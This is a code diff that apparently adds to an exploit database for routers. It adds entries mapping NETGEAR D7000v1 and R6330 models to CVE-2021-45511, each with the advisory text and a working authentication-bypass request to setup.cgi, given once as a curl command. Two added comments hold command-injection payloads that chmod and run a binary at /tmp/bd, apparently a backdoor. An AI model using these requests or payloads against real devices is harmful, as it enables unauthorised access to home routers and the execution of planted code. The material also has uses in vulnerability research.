@@ -687,4 +687,20 @@ print res
         """]
 }
 
+# |chmod${IFS}777${IFS}/tmp/bd
+# |/tmp/bd
+
+model_exp_dic["Netgear_D7000v1"] = {
+    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133','https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
+                      'curl -k -v "http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList"'
+                      ]   
+}
+
+
+model_exp_dic["Netgear_R6330"] = {
+    "CVE-2021-45511":["Certain NETGEAR devices are affected by authentication bypass. This affects AC2100 before 2021-08-27, AC2400 before 2021-08-27, AC2600 before 2021-08-27, D7000 before 2021-08-27, R6220 before 2021-08-27, R6230 before 2021-08-27, R6260 before 2021-08-27, R6330 before 2021-08-27, R6350 before 2021-08-27, R6700v2 before 2021-08-27, R6800 before 2021-08-27, R6850 before 2021-08-27, R6900v2 before 2021-08-27, R7200 before 2021-08-27, R7350 before 2021-08-27, R7400 before 2021-08-27, and R7450 before 2021-08-27.\n['MISC:https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133','https://kb.netgear.com/000063961/Security-Advisory-for-Authentication-Bypass-Vulnerability-on-the-D7000-and-Some-Routers-PSV-2021-0133']",
+                      'http://192.168.0.1/setup.cgi?next_file=BRS_swisscom_success.html&x=todo=PNPX_GetShareFolderList'
+                      ]   
+}
+
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
